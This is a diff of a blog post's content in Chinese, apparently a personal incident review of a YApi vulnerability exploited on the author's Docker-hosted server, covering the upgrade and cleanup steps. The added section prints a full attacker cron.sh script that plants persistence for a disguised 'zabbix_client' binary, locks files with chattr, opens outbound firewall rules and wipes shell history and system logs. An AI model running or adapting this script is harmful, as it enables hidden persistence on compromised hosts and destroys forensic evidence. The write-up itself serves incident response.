@@ -3188,8 +3188,9 @@ log-queries
     <title>YApi 漏洞复盘及解决方案</title>
     <url>//posts/yapi-vulnerability-review/</url>
     <content><![CDATA[<p>今天为了 OPPO 商城的学生认证上了一下教育邮箱，去邮箱验证的时候发现收件箱收了一堆莫名其妙的退信，然后再一看发件箱，发现被拿来发了一堆的广告，感觉大事不妙。</p>
-<p>扫了一下发件箱，发现有一条发送给某个随机邮箱说 YApi 注册成功的信息，我在自己的公网服务上是部署了一个 yapi，又想到好像最近有 YApi 的漏洞。</p>
-<p>于是登上了 yapi 看了情况，果然多了一堆帐号，查了一下漏洞情况，所幸我是用 Docker 运行的 YApi，看起来服务器是安然无恙的。</p>
+<p>扫了一下发件箱，发现有一条发送给某个随机邮箱说 YApi 注册成功的信息，我在自己的公网服务上是部署了一个 YApi，又想到好像最近有 YApi 的漏洞。</p>
+<p>于是登上了 YApi 看了一下，注册用户中果然多了一堆莫名的乱码帐号。</p>
+<p>看起来服务器是安然无恙的，所幸我是用 Docker 运行的 YApi。</p>
 <span id="more"></span>
 <h2 id="漏洞概述">漏洞概述<a class="header-anchor" href="#漏洞概述"></a></h2>
 <p>让专业的人来说：</p>
@@ -3204,7 +3205,7 @@ log-queries
 <li><a href="https://github.com/YMFE/yapi/issues/2229">https://github.com/YMFE/yapi/issues/2229</a></li>
 <li><a href="https://mp.weixin.qq.com/s/yKDmMrhaWZIOTPsz6zqHYA">https://mp.weixin.qq.com/s/yKDmMrhaWZIOTPsz6zqHYA</a></li>
 </ul>
-<p>腾讯安全专家建议采用 YAPI 接口管理平台的政企机构尽快采取以下措施缓解漏洞风险：</p>
+<p>所以接下来就是关闭漏洞利用 ＆ 止损。</p>
 <h3 id="升级版本">升级版本<a class="header-anchor" href="#升级版本"></a></h3>
 <p>更新 Yapi 至官方发布的 1.9.3，新版本用了更为安全的 safeify 模块，可以有效地防止这个漏洞。</p>
 <p>我用的是 <a href="https://github.com/fjc0k/docker-YApi">https://github.com/fjc0k/docker-YApi</a>，</p>
@@ -3240,6 +3241,64 @@ mongo
 
 <span class="token operator">&gt;</span> db.adv_mock.deleteMany<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"mock_script"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">{</span><span class="token variable">$regex</span> <span class="token builtin class-name">:</span> <span class="token string">"sandbox"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到是真的有很多利用脚本。。。</p>
+<p>打开一个 <code>cron.sh</code> 看了一下：</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">#!/bin/bash
+
+crondir1='/var/spool/cron/'"$USER"
+crondir2='/var/spool/cron/crontabs/'"$USER"
+
+chmod 777 /usr/bin/chattr
+chmod 777 /bin/chattr
+
+unlock_cron()
+{
+    chattr -ia /etc/crontab
+    chattr -R -ia /var/spool/cron
+    chattr -R -ia /var/spool/cron/crontabs
+    chattr -R -ia /etc/cron.d
+}
+
+lock_cron()
+{
+    chattr +ia ${crondir1}
+    chattr +ia ${crondir2}
+    chattr +ia /etc/cron.d/zabbix_client
+}
+
+rtdir="/etc/zabbix_flag"
+echo 1 &gt; ${rtdir}
+
+if [ -f "$rtdir" ]
+then
+    mv /tmp/zabbix_client /etc/zabbix_client
+    unlock_cron
+    cat ${crondir1} | grep -E -v "^#" | grep -q "zabbix_client" ||               echo "*/30 * * * * /etc/zabbix_client &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir1}
+    cat ${crondir2} | grep -E -v "^#" | grep -q "zabbix_client" ||               echo "*/30 * * * * /etc/zabbix_client &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir2}
+    cat /etc/cron.d/zabbix_client | grep -E -v "^#" | grep -q "zabbix_client" || echo "*/40 * * * * root /etc/zabbix_client &gt;/dev/null 2&gt;&amp;1" &gt;&gt; /etc/cron.d/zabbix_client
+    cat /etc/crontab | grep -E -v "^#" | grep -q "zabbix_client" ||              echo "0 * * * * root /etc/zabbix_client &gt;/dev/null 2&gt;&amp;1" &gt;&gt; /etc/crontab
+    crontab -l | grep -E -v "^#" | grep -q "zabbix_client" || (crontab -l ; echo "*/30 * * * * /etc/zabbix_client &gt;/dev/null 2&gt;&amp;1") | crontab -    
+    lock_cron
+    chmod 777 /etc/zabbix_client
+    chattr +ia /etc/zabbix_client
+else
+    unlock_cron
+    crontab -l | grep -E -v "^#" | grep -q "zabbix_client" || (crontab -l ; echo "*/30 * * * * /tmp/zabbix_client &gt;/dev/null 2&gt;&amp;1") | crontab -
+    lock_cron
+    chmod 777 /tmp/zabbix_client
+    chattr +ia /tmp/zabbix_client
+fi
+iptables -A OUTPUT -p tcp -j ACCEPT
+history -c
+echo &gt; /var/spool/mail/root
+echo &gt; /var/log/wtmp
+echo &gt; /var/log/secure
+echo &gt; /root/.bash_history
+chmod 444 /usr/bin/chattr
+chmod 444 /bin/chattr
+rm /etc/zabbix_flag
+rm cron.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>搜了一下 rabbix 是什么：Real-time monitoring of IT components and services, such as networks, servers, VMs, applications and the cloud.</p>
+<p>但是用 docker 的好处就出现了～docker-compose 停止再启动，一切利用都木有了…</p>
 <h2 id="后记">后记<a class="header-anchor" href="#后记"></a></h2>
 <p>这个漏洞很早之前就看过相关新闻，但没联想到会发生在自己身上…
 看记录，6.4 号就有人注册了新的 yapi 帐号，止血太晚～</p>
